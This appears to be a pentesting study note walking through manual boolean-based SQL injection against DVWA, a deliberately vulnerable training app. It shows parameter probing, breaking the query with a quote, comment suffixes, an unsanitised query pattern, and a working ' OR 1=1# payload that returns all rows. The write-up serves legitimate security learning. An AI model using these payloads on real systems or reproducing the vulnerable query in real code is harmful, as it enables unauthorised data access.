# 02 - Craft Exploit

Search Tag: #sql-injection #boolean-based #dvwa

## 2.1 -   Retrieving Hidden Data

### 2.1.1 - Exploring The Parameter

#### 2.1.1.1 - Exceed The Upper and Lower Boundary Limits

We will try to determine the range of the data resides in the database to find the limits by exceeding the boundary range.

```
id=0
id=1
id=2
id=3
id=4
id=5
id=6
```

- The start of the valid responses.

![[01 - Valid Response Input Parameter Boundary Limits.png]]

- Until reaching the end of the data of what is available in the database.

![[02 - Invalid Response Input Parameter Boundary Limits Exceeded.png]]

#### 2.1.1.2 - Mathematical Expression

This will provide an indicator if the numeric values perform mathematical operation. A probable factor of SQL injection however nothing works.

```
id=6-1
id=6-2
id=5+1
id=2*2
id=6/3
```

#### 2.1.1.3 - Invalidate Values

This will provide a clear space to perform data collection when exploiting the parameter.

- Exceeding the boundary limits.

```
id=99
id=-1
```

- Changing the numeric datatype to decimal.

```
id=1.0
id=1.5
```

- Using strings.

```
id=a
id=abcdef
```

- Using SQL logical operators `OR`, `AND`, `XOR`, `NOT`

```
id=1 AND 1=1
id=1 AND 1=2
```

### 2.1.2 - Vulnerability Detection

#### 2.1.2.1 - Break the Query

We will trigger a SQL error using `'` as a prefix to take advantage of unsantized user input.

![[03 - Break Query.png]]

#### 2.1.2.2 - Copying the Error Statement

First we breakdown the process step by step to figure it out how join the query to craft our final payload.

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
```

- Understand from the developer's perspective.

```
				   ''1'''    at line 1 (SO THIS IS THE ERROR)
```

- Separate the single quotes.

```
(DELETE LEFTHANDSIDE SINGLE QUOTE) ' '1' ' ' (DELETE RIGHTHAND SIDE SINGLE QUOTE)

                                     '1' ' ' (DELETE RIGHTHAND SIDE SINGLE QUOTE)

                                     '1''
```

- Once you deleted the rest of the quotes.

```
                                     '1''    (AFTER ELIMATING THE REST WE HAVE THE REMAINING)
```

- Highlight the single quote from the right hand side of the quotes.

```
                                     '1(')'  (MARKING THE SINGLE QUOTE WITH PARENTHESES, WHICH IS BREAKING THE SQL BACKEND)
```

- Let's imagine the vulnerable PHP code snippet from the webserver backend processes it.

```php
SELECT first_name, last_name FROM users WHERE id = '$id';
```

- We include a single quote as a prefix which causes the error. So we need to escape it by commenting it out with a suffix.

```sql
SELECT first_name, last_name FROM users WHERE id = '1'';
```

#### 2.1.2.3 - Joining the Query

^a3394c

Now we need a suffix to terminate to get results. In MySQL we will terminate it with comments (`--`)  as a suffix. It will treat the rest of the snippets by interpreting it as SQL. We can leverage this craft the payload to exploit further.

`'--`

![[04 - Join Query with Double Dashes.png]]

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
```

Looks like it didn't work. Let's instead try adding the `#` as a suffix.

`'#`

![[05 - Query Joined via Hashtag.png]]

![[06 - Query Joined via Hashtag Valid Response.png]]

It responds normally. We can use this to exploit it. Before that let's try adding another variant to comment it out with `-- -`.

`'-- -`

![[07 - Query Joined via Triple Dashes with Whitespace.png]]

![[08 - Query Joined via Triple Dashes with Whitespace Valid Response.png]]

Excellent now we can move on.

### 2.1.3 - Craft Payload

This is the syntax with a place holder of SQL payload.

`'<SQL_Payload>#`

### 2.1.4 - Exploit

^5404cb

- Let's retrieve the hidden data.

`' OR 1=1#`

![[09 - Boolean-Based Query Payload.png]]

![[10 - Boolean-Based Response Returned Full Data.png]]

- You can switch to different SQL logical operators `OR`, `AND`, `XOR`, `NOT`. Experiment this on your own depending on web application you're up against.

These techniques are possible due to the references I found online. I strongly recommend you to read them one by one because some SQL statement error responses may differ.

---
## References

- [Web Application Pentesting – Manual SQL Injection With Error Based String Method](https://gbhackers.com/manual-sql-injection/)

- [How to Perform Manual SQL Injection While Pentesting With Single Quote Error-Based Parenthesis Method](https://gbhackers.com/manual-sql-injection-2/)

- [How to Perform Manual SQL Injection With Double Quotes Error-Based String Method](https://gbhackers.com/perform-manual-sql-injection-2/)

- [Web Application Pentesting with Manual SQL Injection – Integer Based](https://gbhackers.com/perform-manual-sql-injection/)

- [Best approach to Error-Based SQL injection](https://medium.com/@anekantsinghai/best-approach-to-error-based-sql-injection-30c73fd8fa41)